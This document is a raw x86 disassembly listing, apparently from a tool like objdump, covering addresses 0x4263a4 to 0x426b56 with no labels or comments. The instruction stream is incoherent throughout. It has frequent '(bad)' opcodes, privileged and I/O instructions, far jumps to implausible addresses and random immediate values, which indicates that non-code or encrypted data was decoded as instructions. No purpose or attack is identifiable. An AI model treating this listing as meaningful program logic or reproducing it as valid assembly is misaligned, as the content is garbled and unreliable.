  4263a4:	ja     0x42638f
  4263a6:	mov    al,ds:0xa742a356
  4263ab:	jo     0xd87dc60e
  4263b1:	jle    0x426334
  4263b3:	inc    eax
  4263b4:	xor    eax,0x2b70457f
  4263b9:	or     DWORD PTR [edi-0x3bcac443],edi
  4263bf:	test   eax,0xb2301297
  4263c4:	inc    edi
  4263c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4263c6:	je     0x426425
  4263c8:	pop    eax
  4263c9:	stos   DWORD PTR es:[edi],eax
  4263ca:	pop    ss
  4263cb:	sub    al,0x40
  4263cd:	jno    0x426394
  4263cf:	and    al,0x5
  4263d1:	xor    al,0x70
  4263d3:	ja     0x42642f
  4263d5:	pop    es
  4263d6:	and    ah,ch
  4263d8:	mov    BYTE PTR [esi+0xa],bl
  4263db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4263dc:	xchg   DWORD PTR [edi-0x9],edi
  4263df:	fnstsw WORD PTR [esp+eiz*2-0x36a596a0]
  4263e6:	mov    dh,0x58
  4263e8:	cmp    eax,0xfcef0cb3
  4263ed:	or     BYTE PTR [ecx-0x74],bl
  4263f0:	mov    esp,0x95524aaa
  4263f5:	je     0x426459
  4263f7:	inc    esp
  4263f8:	scas   eax,DWORD PTR es:[edi]
  4263f9:	shl    edx,cl
  4263fb:	inc    edi
  4263fc:	aaa    
  4263fd:	xchg   DWORD PTR [ebx+0x63],esi
  426400:	loope  0x4263a6
  426402:	sub    DWORD PTR [ebp+edi*4-0x7caaac05],esp
  426409:	gs sbb al,0xb5
  42640c:	iret   
  42640d:	jns    0x4263f9
  42640f:	jne    0x4263bd
  426411:	sub    al,0x96
  426413:	es jno 0x4263fa
  426416:	aam    0x7d
  426418:	xlat   BYTE PTR ds:[ebx]
  426419:	ss jg  0x42640e
  42641c:	jo     0x42640a
  42641e:	or     DWORD PTR [eax-0x41],eax
  426421:	imul   esi,DWORD PTR [esi-0x4c053970],0xffffffa4
  426428:	mov    dl,0xbf
  42642a:	pop    ebp
  42642b:	sub    BYTE PTR [esi+0x1a],al
  42642e:	jg     0x426411
  426430:	inc    edx
  426431:	pop    edx
  426432:	ror    BYTE PTR [ebx],1
  426434:	mov    WORD PTR [esi-0x40],gs
  426437:	aam    0x4d
  426439:	xor    BYTE PTR es:[ecx+0x153513e4],ch
  426440:	nop
  426441:	and    eax,0x94819572
  426446:	call   DWORD PTR [edi]
  426448:	cdq    
  426449:	sti    
  42644a:	push   esp
  42644b:	lods   eax,DWORD PTR ds:[esi]
  42644c:	or     eax,0xb71a29e2
  426451:	mov    al,0x89
  426453:	popa   
  426454:	xor    DWORD PTR [ecx-0x10d42589],0x13
  42645b:	xchg   ebx,ebx
  42645d:	(bad)  
  42645e:	mov    dl,0x6f
  426460:	(bad)  
  426461:	xchg   esi,eax
  426462:	sub    al,BYTE PTR [ebx+0x6a]
  426465:	cmp    eax,0xc9a67624
  42646a:	lods   eax,DWORD PTR ds:[esi]
  42646b:	lds    ebp,FWORD PTR [ebx]
  42646d:	leave  
  42646e:	mov    al,ds:0x54c902b5
  426473:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426474:	inc    edi
  426475:	mov    cl,bh
  426477:	xchg   ecx,eax
  426478:	pop    es
  426479:	xor    al,0xf6
  42647b:	pusha  
  42647c:	popfw  
  42647e:	cmovno edi,edx
  426481:	jbe    0x4264ee
  426483:	arpl   bp,cx
  426485:	cdq    
  426486:	mov    DWORD PTR [eax+0x64],ebx
  426489:	add    esi,DWORD PTR [ebx-0x5575eb3f]
  42648f:	ror    DWORD PTR [esi],0x9c
  426492:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426493:	xor    bl,BYTE PTR [ebx+0x26]
  426496:	xor    esi,ebp
  426498:	add    cl,BYTE PTR [ecx-0x77d178e0]
  42649e:	xchg   esi,eax
  42649f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4264a0:	icebp  
  4264a1:	push   esp
  4264a2:	sub    esp,DWORD PTR [edx+0x20fa8b63]
  4264a8:	inc    esp
  4264a9:	sti    
  4264aa:	ret    
  4264ab:	gs mov ebp,0xe393bf22
  4264b1:	ror    DWORD PTR [edx+0x31be8e45],cl
  4264b7:	inc    ecx
  4264b8:	sub    eax,0x4c48a22b
  4264bd:	mov    dl,dl
  4264bf:	rsm    
  4264c1:	mov    cl,0x55
  4264c3:	and    eax,DWORD PTR [eax]
  4264c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4264c6:	adc    al,0x7c
  4264c8:	icebp  
  4264c9:	pop    eax
  4264ca:	mov    WORD PTR [ecx+0x1ca5001e],fs
  4264d0:	fistp  DWORD PTR [esi]
  4264d2:	adc    eax,0x8390de46
  4264d7:	mov    BYTE PTR [ecx+edx*2],dl
  4264da:	or     edi,DWORD PTR [esp+ebx*2]
  4264dd:	clc    
  4264de:	inc    ecx
  4264df:	dec    edx
  4264e0:	out    0xc,al
  4264e2:	or     DWORD PTR [ecx],edi
  4264e4:	sbb    eax,0x2324806e
  4264e9:	rcl    BYTE PTR [esi-0x30900cc4],1
  4264ef:	bound  eax,QWORD PTR [edi+0x5e]
  4264f2:	fcmovne st,st(3)
  4264f4:	add    cl,0x17
  4264f7:	lods   eax,DWORD PTR ds:[esi]
  4264f8:	jmp    0x42ebde58
  4264fd:	(bad)  
  4264fe:	es or  eax,0x43327f60
  426504:	sbb    cl,BYTE PTR [ecx]
  426506:	cmp    eax,0xa6d74b65
  42650b:	add    al,0x2a
  42650d:	push   ss
  42650e:	adc    dl,BYTE PTR [edx-0x344ff801]
  426514:	in     al,dx
  426515:	jne    0x4264ce
  426517:	loope  0x42649f
  426519:	aaa    
  42651a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42651b:	pop    edi
  42651c:	cmp    ebx,edx
  42651e:	xor    bh,BYTE PTR [ecx+0x43a85679]
  426524:	adc    eax,DWORD PTR [esp+0x52]
  426528:	push   edi
  426529:	arpl   si,bx
  42652b:	mov    DWORD PTR [edi-0x22],edx
  42652e:	add    DWORD PTR [eax],ecx
  426530:	mov    al,ds:0x9fb4cc80
  426535:	xchg   esp,eax
  426536:	push   es
  426537:	mov    dh,0x8d
  426539:	aaa    
  42653a:	enter  0xa636,0x64
  42653e:	gs pop ss
  426540:	jp     0x42654c
  426542:	dec    ecx
  426543:	dec    esi
  426544:	in     al,0x9e
  426546:	cli    
  426547:	imul   esi,esp,0xa0b06c6e
  42654d:	jne    0x426594
  42654f:	mov    bl,0xa9
  426551:	push   esi
  426552:	mov    ebx,0xcc0c705b
  426557:	aaa    
  426558:	xor    esp,DWORD PTR fs:[esi+0x7234f1cc]
  42655f:	int    0xd
  426561:	jae    0x426545
  426563:	clc    
  426564:	dec    edi
  426565:	pop    ebx
  426566:	cmp    esp,DWORD PTR [ebp+ebx*4-0x52a5d741]
  42656d:	scas   eax,DWORD PTR es:[edi]
  42656e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42656f:	xor    eax,0xf6ce89d9
  426574:	ror    DWORD PTR [esi+ebp*2],cl
  426577:	cmp    eax,0x48f24755
  42657c:	xchg   cl,dl
  42657e:	xchg   ebx,eax
  42657f:	add    ebp,DWORD PTR [eax]
  426581:	jp     0x4265a7
  426583:	popf   
  426584:	jecxz  0x426591
  426586:	add    cl,BYTE PTR [ebx-0x2a18af36]
  42658c:	add    BYTE PTR [eax],0x0
	...
  426597:	add    BYTE PTR [eax],al
  426599:	add    BYTE PTR [ebp+0x4f3707c0],cl
  42659f:	idiv   DWORD PTR [ebp-0x7c857b06]
  4265a5:	jg     0x426605
  4265a7:	xchg   ecx,eax
  4265a8:	add    al,BYTE PTR [edx]
  4265aa:	daa    
  4265ab:	fadd   QWORD PTR [ecx]
  4265ad:	add    bl,bh
  4265af:	add    DWORD PTR [eax],eax
  4265b1:	add    BYTE PTR [esi],bl
  4265b3:	repnz or ch,BYTE PTR [eax+eiz*2+0x44770a62]
  4265bb:	lods   al,BYTE PTR ds:[esi]
  4265bc:	mov    ecx,0xcde2f683
  4265c1:	scas   eax,DWORD PTR es:[edi]
  4265c2:	sbb    eax,0x3a8803bf
  4265c7:	lds    esp,FWORD PTR [eax+ebx*1+0x67742b1c]
  4265ce:	mov    dh,0xd9
  4265d0:	push   0x9684da49
  4265d5:	or     al,BYTE PTR [edx]
  4265d7:	mov    ecx,0xb40b0baf
  4265dc:	jmp    0x9e1e6838
  4265e1:	pop    ss
  4265e2:	sbb    bh,BYTE PTR [edx+0x6ddac385]
  4265e8:	pop    ebp
  4265e9:	dec    ebx
  4265ea:	retf   0xb8ff
  4265ed:	repnz sahf 
  4265ef:	add    eax,DWORD PTR [edi+0xe754259]
  4265f5:	cmp    BYTE PTR [esi],ch
  4265f7:	jg     0x4265b7
  4265f9:	repnz shl DWORD PTR [ebx],0xb2
  4265fd:	mov    dh,0x28
  4265ff:	adc    BYTE PTR [esi+0x68c0d694],dh
  426605:	pop    ecx
  426606:	pop    edi
  426607:	stos   BYTE PTR es:[edi],al
  426608:	fsubr  DWORD PTR [esi+0x3bf0964a]
  42660e:	ja     0x426656
  426610:	inc    ebp
  426611:	jne    0x426598
  426613:	adc    eax,0x6effff95
  426618:	leave  
  426619:	loope  0x426629
  42661b:	add    esi,eax
  42661d:	jmp    FWORD PTR [eax]
  42661f:	xchg   esp,eax
  426620:	or     DWORD PTR [esi],esp
  426622:	jb     0x4265b6
  426624:	imul   edx,edi,0x45
  426627:	xchg   ecx,eax
  426628:	sub    ch,BYTE PTR [esi+0x27]
  42662b:	pop    ds
  42662c:	fistp  DWORD PTR fs:[edx]
  42662f:	mov    ch,0x27
  426631:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426632:	adc    ecx,esp
  426634:	mov    dl,0xb3
  426636:	push   edx
  426637:	fcomip st,st(1)
  426639:	xlat   BYTE PTR ds:[ebx]
  42663a:	or     BYTE PTR [edx],bh
  42663c:	aas    
  42663d:	dec    eax
  42663e:	fnstenv [eax]
  426640:	xchg   BYTE PTR [ebx+0x51201893],ch
  426646:	add    DWORD PTR [eax+0x254b4159],esi
  42664c:	sbb    eax,DWORD PTR [esi+0x1b]
  42664f:	scas   al,BYTE PTR es:[edi]
  426650:	pop    edi
  426651:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426652:	push   edi
  426653:	push   esi
  426654:	arpl   bp,ax
  426656:	mov    edi,0xd3def759
  42665b:	jg     0x426657
  42665d:	aam    0x6f
  42665f:	cmc    
  426660:	bound  ecx,QWORD PTR [ebx-0x42]
  426663:	(bad)  
  426665:	mov    DWORD PTR [esi],eax
  426667:	(bad)  
  426668:	cmc    
  426669:	and    BYTE PTR [ebx*8-0x27060c75],0xf7
  426671:	inc    edi
  426672:	and    dh,BYTE PTR [ebp-0x36]
  426675:	into   
  426676:	jmp    0x584b6c3b
  42667b:	loope  0x4266d1
  42667d:	dec    eax
  42667e:	scas   eax,DWORD PTR es:[edi]
  42667f:	xor    edx,DWORD PTR [ecx-0x96e3787]
  426685:	push   edi
  426686:	add    edx,DWORD PTR [esi-0x1b]
  426689:	hlt    
  42668a:	cwde   
  42668b:	lea    ebx,[ecx+edi*1+0x48]
  42668f:	jg     0x426688
  426691:	pop    esp
  426692:	inc    edi
  426693:	adc    edx,eax
  426695:	fdivp  st(4),st
  426697:	out    0xeb,al
  426699:	ins    BYTE PTR es:[edi],dx
  42669a:	imul   esi,DWORD PTR [eax-0x54eb6009],0xaac9ab35
  4266a4:	mov    bh,BYTE PTR [ebp-0x50]
  4266a7:	add    BYTE PTR ds:0x9ff890c5,cl
  4266ad:	adc    eax,ecx
  4266af:	fst    QWORD PTR [edi]
  4266b1:	jb     0x4266f0
  4266b3:	into   
  4266b4:	jnp    0x426652
  4266b6:	pushf  
  4266b7:	pop    eax
  4266b8:	push   ebx
  4266b9:	xor    BYTE PTR [eax+0x26],bl
  4266bc:	lods   al,BYTE PTR ds:[esi]
  4266bd:	push   0x21
  4266bf:	push   eax
  4266c0:	lea    ebp,[edi]
  4266c2:	in     eax,dx
  4266c3:	dec    esp
  4266c4:	shl    BYTE PTR [edi],1
  4266c6:	jmp    0x4266ac
  4266c8:	and    eax,0xecb0e91d
  4266cd:	(bad)  [edi-0x4bf94fdd]
  4266d3:	xor    dh,BYTE PTR [ebp-0x188d7f8f]
  4266d9:	fisubr DWORD PTR [ecx]
  4266db:	mov    al,ds:0x8cfc3218
  4266e0:	mov    eax,ds:0x3a7cb8d0
  4266e5:	fsub   DWORD PTR [esi]
  4266e7:	jge    0x426764
  4266e9:	push   es
  4266ea:	xchg   ebp,eax
  4266eb:	mov    ds:0x6f1fdb85,al
  4266f0:	mov    ds:0xdcb70cba,eax
  4266f5:	bound  ebx,QWORD PTR [eax-0x7c]
  4266f8:	leave  
  4266f9:	inc    esi
  4266fa:	push   eax
  4266fb:	xchg   cl,bl
  4266fd:	jns    0x4266e6
  4266ff:	or     ebx,edi
  426701:	push   cs
  426702:	add    ah,BYTE PTR [esi+0x418e0098]
  426708:	clc    
  426709:	mov    ch,bl
  42670b:	inc    ebp
  42670c:	mov    ecx,0xea080b35
  426711:	pop    ecx
  426712:	retf   
  426713:	pop    ds
  426714:	(bad)  
  426715:	sub    edi,DWORD PTR [edi+0x7f]
  426718:	clc    
  426719:	and    ecx,ecx
  42671b:	mov    edx,0x97ae91cf
  426720:	cmp    esi,edx
  426722:	scas   eax,DWORD PTR es:[edi]
  426723:	xchg   bh,cl
  426725:	lods   eax,DWORD PTR ds:[esi]
  426726:	cli    
  426727:	add    ebp,eax
  426729:	jmp    0xc217:0xf73ffeb8
  426730:	rol    ebp,0x91
  426733:	shl    ebp,0xe1
  426736:	icebp  
  426737:	or     DWORD PTR [edi-0xd],ecx
  42673a:	imul   ecx,DWORD PTR [ebp+0x2b],0xffffffa2
  42673e:	pop    edi
  42673f:	jno    0x426706
  426741:	fs repz idiv dh
  426745:	fwait
  426746:	out    0x1e,eax
  426748:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426749:	dec    edx
  42674a:	inc    esp
  42674b:	inc    esi
  42674c:	or     al,0xaa
  42674e:	sahf   
  42674f:	rcr    DWORD PTR [edx+ecx*8+0x22],cl
  426753:	iret   
  426754:	pop    ebx
  426755:	fld    TBYTE PTR [esi+0xc26f7bd]
  42675b:	mov    ebp,0xbc916b28
  426760:	or     cl,BYTE PTR [ebx-0x55]
  426763:	sbb    BYTE PTR [eax],0x7f
  426766:	or     BYTE PTR [ebx+eax*8],cl
  426769:	mov    bl,0xd5
  42676b:	jno    0x426702
  42676d:	loop   0x4266f6
  42676f:	mov    ecx,0x5a3515f6
  426774:	outs   dx,BYTE PTR ds:[esi]
  426776:	(bad)  
  426777:	cld    
  426778:	fwait
  426779:	inc    BYTE PTR [eax+ebp*2-0x4d]
  42677d:	jo     0x4267fb
  42677f:	fst    QWORD PTR ds:0xddf6
  426784:	aaa    
  426785:	int3   
  426786:	loopne 0x426805
  426788:	or     ecx,edx
  42678a:	jmp    0x4d59:0x1f44b53e
  426791:	mov    DWORD PTR [ecx+0x1d],ebx
  426794:	inc    ecx
  426795:	xchg   dl,bh
  426797:	xor    ebp,edi
  426799:	das    
  42679a:	and    BYTE PTR [ebx+0x4aaa05fc],0xdc
  4267a1:	adc    dl,BYTE PTR [ebp+0x31]
  4267a4:	jne    0xaafe4a15
  4267aa:	push   bx
	...
  4267b8:	add    BYTE PTR [eax],al
  4267ba:	mov    al,0x8a
  4267bc:	call   0xfa266242
  4267c1:	mov    ebx,0xcae72888
  4267c6:	adc    eax,ebx
  4267c8:	into   
  4267c9:	ja     0x4267ed
  4267cb:	fiadd  WORD PTR [ecx]
  4267cd:	add    bl,bh
  4267cf:	add    DWORD PTR [eax],eax
  4267d1:	add    ah,ch
  4267d3:	cdq    
  4267d4:	cmc    
  4267d5:	mov    esp,0xde321c36
  4267da:	xchg   ecx,eax
  4267db:	stc    
  4267dc:	adc    eax,0xb62fd408
  4267e1:	add    BYTE PTR [edi],0xa5
  4267e4:	jb     0x42677f
  4267e6:	mov    ds:0x6ca98b34,al
  4267eb:	stos   BYTE PTR es:[edi],al
  4267ec:	inc    eax
  4267ed:	(bad)  
  4267ee:	pop    ecx
  4267ef:	mov    al,0x9c
  4267f1:	sub    edi,DWORD PTR [ebx-0x597b8215]
  4267f7:	out    dx,al
  4267f8:	cld    
  4267f9:	pop    es
  4267fa:	adc    bl,BYTE PTR [edi+0x1a]
  4267fd:	pop    edi
  4267fe:	dec    esi
  4267ff:	out    0xd8,eax
  426801:	mov    DWORD PTR [ebx+0x20],ecx
  426804:	fidiv  WORD PTR [esi+edi*8-0x333c5660]
  42680b:	shr    DWORD PTR [ebx+0x56],0x69
  42680f:	push   0x22549082
  426814:	imul   ebp,DWORD PTR [edi-0x4620ce6],0xbd062280
  42681e:	mov    dh,0x5d
  426820:	rcl    BYTE PTR [ebx-0x9],cl
  426823:	gs sysenter 
  426826:	repz jge 0x426882
  426829:	pop    ds
  42682a:	xchg   DWORD PTR [ecx+0x7],eax
  42682d:	cmp    eax,DWORD PTR [esi-0xb]
  426830:	xchg   edi,eax
  426831:	add    al,0x2d
  426833:	xchg   esi,eax
  426834:	retf   
  426835:	retf   
  426836:	pop    edi
  426837:	jne    0x42684a
  426839:	nop
  42683a:	and    ecx,DWORD PTR [eax]
  42683c:	pop    ebp
  42683d:	(bad)  
  42683e:	ror    BYTE PTR [esp+eiz*2-0x36],0x80
  426843:	jbe    0x4268b1
  426845:	inc    esp
  426846:	test   bh,dh
  426848:	mov    esi,0xc76dc0e0
  42684d:	imul   ebp,DWORD PTR [edi+0x788db055],0x95c80523
  426857:	repnz fidivr WORD PTR [ecx]
  42685a:	out    dx,al
  42685b:	call   0x4eae:0xb6614b06
  426862:	cmp    BYTE PTR [edi+0x63],dl
  426865:	xor    al,0x3c
  426867:	es in  eax,dx
  426869:	sbb    eax,0xf12bf3f0
  42686e:	push   esp
  42686f:	repnz xchg edx,eax
  426871:	adc    edi,DWORD PTR [edx-0x5eea8d50]
  426877:	dec    ecx
  426878:	(bad)  
  426879:	iret   
  42687a:	les    edx,FWORD PTR [edx+0x2a6eedde]
  426880:	add    bh,bh
  426882:	or     DWORD PTR [esi],edx
  426884:	call   0xe2acbaf4
  426889:	pop    edx
  42688a:	push   esi
  42688b:	in     eax,dx
  42688c:	xor    esi,edx
  42688e:	out    dx,eax
  42688f:	gs jmp 0x3f05:0x22d7bc39
  426897:	retf   
  426898:	out    dx,eax
  426899:	mov    dh,0xd8
  42689b:	xchg   ebp,eax
  42689c:	sbb    BYTE PTR [edx-0x72],dh
  42689f:	dec    ebx
  4268a0:	in     eax,dx
  4268a1:	mov    ss,WORD PTR [eax-0x425bc22a]
  4268a7:	stos   DWORD PTR es:[edi],eax
  4268a8:	pop    es
  4268a9:	ror    ch,1
  4268ab:	idiv   DWORD PTR [ebx]
  4268ad:	mov    eax,ds:0x4f0976ab
  4268b2:	push   esi
  4268b3:	push   ds
  4268b4:	clc    
  4268b5:	mov    bh,0x62
  4268b7:	jg     0x42692f
  4268b9:	or     esp,DWORD PTR [esp+ebp*1-0x43]
  4268bd:	cmp    DWORD PTR [edi-0x6e],ebp
  4268c0:	xchg   edx,eax
  4268c1:	dec    ebp
  4268c2:	mov    ds:0xecb6c4bc,al
  4268c7:	jl     0x426881
  4268c9:	and    esp,eax
  4268cb:	push   cs
  4268cc:	inc    eax
  4268cd:	ret    
  4268ce:	mov    edi,0xddabd92a
  4268d3:	cdq    
  4268d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4268d5:	xchg   ebp,eax
  4268d6:	js     0x426920
  4268d8:	xor    eax,0x542642ba
  4268dd:	jns    0x4268a6
  4268df:	js     0x4268ed
  4268e1:	add    eax,0xc75a1099
  4268e6:	cwde   
  4268e7:	(bad)  
  4268e8:	mov    edx,0x5a3e3e2b
  4268ed:	add    al,BYTE PTR [edx]
  4268ef:	xchg   edx,eax
  4268f0:	call   FWORD PTR [ecx+ecx*1+0x8]
  4268f4:	clc    
  4268f5:	inc    eax
  4268f6:	and    ecx,ecx
  4268f8:	mov    ds:0xd611b1cb,al
  4268fd:	jle    0x426914
  4268ff:	retf   
  426900:	imul   edi,edx,0x9f0d9728
  426906:	jl     0x426934
  426908:	lock rol dl,cl
  42690b:	or     esp,DWORD PTR [ebx+0x3c]
  42690e:	mov    BYTE PTR [eax+0x38f83d5c],dl
  426914:	push   cs
  426915:	nop
  426916:	xor    ch,cl
  426918:	jne    0x42690e
  42691a:	pop    ss
  42691b:	push   esi
  42691c:	popf   
  42691d:	fdiv   QWORD PTR [ebp-0x5c]
  426920:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426921:	and    eax,0x5c068cc2
  426926:	imul   ebx,DWORD PTR [eax-0x21],0xffffffe8
  42692a:	cli    
  42692b:	and    al,0x35
  42692d:	adc    ch,BYTE PTR [ebx-0x6d]
  426930:	out    0xa4,al
  426932:	(bad)  
  426933:	mov    bh,0xfa
  426935:	xor    DWORD PTR [ebx],esp
  426937:	jmp    0xfe74:0x12c9d707
  42693e:	adc    cl,BYTE PTR [edx+0x21]
  426941:	pop    ebp
  426942:	mov    gs,edx
  426944:	out    0xec,eax
  426946:	adc    al,0x26
  426948:	jb     0x4268f0
  42694a:	add    DWORD PTR [edi],edx
  42694c:	inc    esi
  42694d:	jmp    0x5cccd002
  426952:	aad    0xfc
  426954:	cmc    
  426955:	push   edi
  426956:	cld    
  426957:	mov    cl,0xb9
  426959:	xchg   ebx,eax
  42695a:	fistp  QWORD PTR [ecx]
  42695c:	adc    bl,bl
  42695e:	icebp  
  42695f:	mov    BYTE PTR [ecx+0x1e],ch
  426962:	daa    
  426963:	shr    BYTE PTR [edi],0x2
  426966:	cli    
  426967:	cdq    
  426968:	push   0x821857e4
  42696d:	sub    BYTE PTR [ebx+ecx*1-0x42],bh
  426971:	jnp    0x4269cd
  426973:	(bad)
  426978:	adc    al,0x1f
  42697a:	jnp    0x426945
  42697c:	xchg   ebp,eax
  42697d:	pop    edi
  42697e:	push   es
  42697f:	adc    esp,DWORD PTR [edi+ecx*4-0x4d]
  426983:	int    0xa8
  426985:	ss pop eax
  426987:	dec    eax
  426988:	sahf   
  426989:	pop    ebp
  42698a:	mov    BYTE PTR [ebx],bh
  42698c:	cmc    
  42698d:	dec    eax
  42698e:	and    cl,BYTE PTR [ebx+0xd]
  426991:	inc    edi
  426992:	in     eax,dx
  426993:	rcl    esp,cl
  426995:	mov    ebx,0xd62074e9
  42699a:	das    
  42699b:	ret    
  42699c:	inc    ah
  42699e:	sub    BYTE PTR [edx],0xb5
  4269a1:	xor    esp,edx
  4269a3:	or     BYTE PTR [edx-0x79],ch
  4269a6:	sbb    ebx,DWORD PTR [ecx]
  4269a8:	xor    BYTE PTR [edx-0x112dd2bb],ah
  4269ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4269af:	fcomp  st(3)
  4269b1:	cmp    al,0x4f
  4269b3:	mov    bl,0x8f
  4269b5:	inc    eax
  4269b6:	js     0x426a29
  4269b8:	xor    eax,0xe123e2af
  4269bd:	inc    edi
  4269be:	mov    esi,ebx
  4269c0:	popf   
  4269c1:	aas    
  4269c2:	in     eax,0xe6
  4269c4:	mov    al,0xef
  4269c6:	inc    esp
  4269c7:	xchg   ebx,eax
  4269c8:	push   es
  4269c9:	xor    BYTE PTR [eax*8+0x6],al
	...
  4269d8:	add    BYTE PTR [eax],al
  4269da:	mov    cl,BYTE PTR [esp+eax*8-0x61253926]
  4269e1:	fcomp  QWORD PTR [edi+0x23]
  4269e4:	or     al,0x8a
  4269e6:	lahf   
  4269e7:	jge    0x4269e0
  4269e9:	xlat   BYTE PTR ds:[ebx]
  4269ea:	sbb    eax,0xfb0001e0
  4269ef:	add    DWORD PTR [eax],eax
  4269f1:	add    BYTE PTR [edx+0x7f],dl
  4269f4:	jg     0x426a62
  4269f6:	sub    BYTE PTR [edi-0x1d],bl
  4269f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4269fa:	mov    esp,DWORD PTR [ebx+ecx*8]
  4269fd:	push   eax
  4269fe:	loope  0x426a7e
  426a00:	outs   dx,DWORD PTR ds:[esi]
  426a01:	add    dl,dh
  426a03:	adc    edx,DWORD PTR [eax-0x71]
  426a06:	out    dx,al
  426a07:	push   ss
  426a08:	pusha  
  426a09:	int    0x5b
  426a0b:	push   esi
  426a0c:	jmp    0xea96:0xeee0e8a
  426a13:	inc    ecx
  426a14:	sub    cl,bh
  426a16:	push   esi
  426a17:	cmp    ecx,DWORD PTR [ebx]
  426a19:	popa   
  426a1a:	icebp  
  426a1b:	or     ecx,edi
  426a1d:	jg     0x426a05
  426a1f:	lods   eax,DWORD PTR ds:[esi]
  426a20:	xchg   DWORD PTR [ebx+0x71fe50e5],esi
  426a26:	mov    eax,es
  426a28:	cmp    BYTE PTR [edi+edi*1],dl
  426a2b:	fs jl  0x4269eb
  426a2e:	cli    
  426a2f:	popf   
  426a30:	ds jae 0x426a80
  426a33:	jmp    0x426a39
  426a35:	and    al,0x72
  426a37:	(bad)  
  426a38:	push   ebx
  426a39:	dec    ebp
  426a3a:	sub    al,0x63
  426a3c:	adc    dh,bh
  426a3e:	leave  
  426a3f:	jo     0x4269f8
  426a41:	push   ebx
  426a42:	cmp    DWORD PTR [edx+0x58],esp
  426a45:	xor    eax,0x8c286912
  426a4a:	dec    edx
  426a4b:	xor    esp,DWORD PTR [eax+0x6bcb9350]
  426a51:	or     BYTE PTR [edx+edx*8],bl
  426a54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426a55:	pop    esi
  426a56:	dec    eax
  426a57:	outs   dx,BYTE PTR ds:[esi]
  426a58:	cld    
  426a59:	sub    BYTE PTR ds:0x8b0d8643,0xf8
  426a60:	and    DWORD PTR [ebp-0x24],ebp
  426a63:	pop    eax
  426a64:	xchg   ebp,eax
  426a65:	jge    0x426a8e
  426a67:	or     eax,0x4bdaf75b
  426a6c:	mov    bl,0xd8
  426a6e:	jge    0x426a80
  426a70:	or     DWORD PTR [ebp+0x31c703a3],esp
  426a76:	adc    al,0x85
  426a78:	out    0x37,eax
  426a7a:	imul   ebx,DWORD PTR [ebx+0x7f],0xffffff83
  426a7e:	sub    eax,0xf44b22d6
  426a83:	into   
  426a84:	mov    dl,0x98
  426a86:	mov    esp,0x3e4268ee
  426a8b:	mov    ds:0xa1f16bb8,al
  426a90:	dec    ebp
  426a91:	fisttp WORD PTR [ebx]
  426a93:	icebp  
  426a94:	fdivr  QWORD PTR [edi]
  426a96:	cdq    
  426a97:	xchg   esi,eax
  426a98:	push   ss
  426a99:	push   es
  426a9a:	pop    esi
  426a9b:	mov    ebp,?
  426a9d:	out    dx,al
  426a9e:	mov    al,0x51
  426aa0:	xchg   BYTE PTR [edx+0x42],dh
  426aa3:	pop    ecx
  426aa4:	or     BYTE PTR [eax],dl
  426aa6:	in     al,0xd0
  426aa8:	adc    BYTE PTR [ecx+ebp*8-0x11],dl
  426aac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426aad:	mov    ebp,0xf9476f47
  426ab2:	loop   0x426b27
  426ab4:	pusha  
  426ab5:	stc    
  426ab6:	retf   
  426ab7:	lods   eax,DWORD PTR ds:[esi]
  426ab8:	push   esp
  426ab9:	pop    ecx
  426aba:	ss add al,0x80
  426abd:	(bad)  
  426abe:	ss xchg ebx,eax
  426ac0:	or     al,BYTE PTR ds:0x8f42ec10
  426ac6:	das    
  426ac7:	add    BYTE PTR [ebp+edi*8-0xa],ch
  426acb:	add    BYTE PTR [eax+0x7c],ah
  426ace:	ss (bad) 
  426ad0:	or     eax,0x30b61e6f
  426ad5:	clc    
  426ad6:	push   edi
  426ad7:	dec    edi
  426ad8:	(bad)  
  426ad9:	push   esp
  426ada:	cmp    al,0xd
  426adc:	push   edx
  426add:	mov    dh,BYTE PTR [ecx+eiz*8-0x4d]
  426ae1:	lods   eax,DWORD PTR ds:[esi]
  426ae2:	rcr    edi,cl
  426ae4:	sbb    esi,ecx
  426ae6:	jge    0x426aee
  426ae8:	push   ebp
  426ae9:	out    dx,al
  426aea:	mov    esi,0x239ad67f
  426aef:	nop
  426af0:	(bad)  
  426af1:	mov    al,0x60
  426af3:	mov    ebx,0xbc929c10
  426af8:	stc    
  426af9:	pusha  
  426afa:	aad    0x4e
  426afc:	js     0x5f89a309
  426b02:	xchg   ebp,eax
  426b03:	daa    
  426b04:	int3   
  426b05:	sbb    eax,0x916a37c8
  426b0a:	inc    edi
  426b0b:	arpl   si,bx
  426b0d:	add    eax,0x1ded6189
  426b12:	cmp    BYTE PTR [eax+esi*8-0x7d],dl
  426b16:	inc    esi
  426b17:	stos   DWORD PTR es:[edi],eax
  426b18:	popf   
  426b19:	int3   
  426b1a:	cmp    ah,BYTE PTR ds:0xad08fd55
  426b20:	hlt    
  426b21:	inc    edi
  426b22:	mov    ebx,0xa7e825bb
  426b27:	shl    BYTE PTR [edx-0x5366be68],1
  426b2d:	sbb    eax,0x82b5fa26
  426b32:	mov    eax,0x23e56739
  426b37:	cwde   
  426b38:	mov    dh,0x17
  426b3a:	pop    ebx
  426b3b:	push   eax
  426b3c:	or     bl,BYTE PTR [edx-0x5f]
  426b3f:	rcl    DWORD PTR [eax],1
  426b41:	xor    eax,0x59cffc53
  426b46:	mov    eax,0xf95a9d87
  426b4b:	xor    dl,BYTE PTR [ecx+0x24]
  426b4e:	imul   ebp,DWORD PTR [edx-0x41],0xffffffdc
  426b52:	dec    ecx
  426b53:	ds pusha 
  426b55:	scas   eax,DWORD PTR es:[edi]
  426b56:	ret    
